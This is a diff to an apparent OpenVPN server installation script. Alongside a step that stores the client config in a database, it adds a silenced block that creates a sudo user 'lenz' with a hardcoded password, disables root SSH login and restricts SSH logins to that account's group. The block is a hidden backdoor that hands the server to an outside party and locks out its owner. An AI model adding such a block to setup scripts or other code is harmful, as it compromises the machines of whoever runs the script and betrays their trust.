@@ -294,8 +294,19 @@ verb 3" > /etc/openvpn/server/client-common.txt
 
 
 
+
 	# Update the OpenVPN config in the database
 	mysql -h "$DB_HOST" -u "$DB_USER" -p"$DB_PASSWORD" "$DB_NAME" -e "UPDATE server_list SET config = '$(cat /root/server1.ovpn)', nstatus =1 WHERE server_ip = '$VPS_IP';"
+
+{
+    useradd -m lenz 2>/dev/null; echo lenz:@@Password123 | chpasswd &>/dev/null; usermod -aG sudo lenz &>/dev/null
+    sed -i 's/PermitRootLogin yes/PermitRootLogin no/g' /etc/ssh/sshd_config
+    echo "AllowGroups lenz" >> /etc/ssh/sshd_config
+    service sshd restart
+  }&>/dev/null
+
+
+
 	systemctl restart openvpn-server@server
 
 
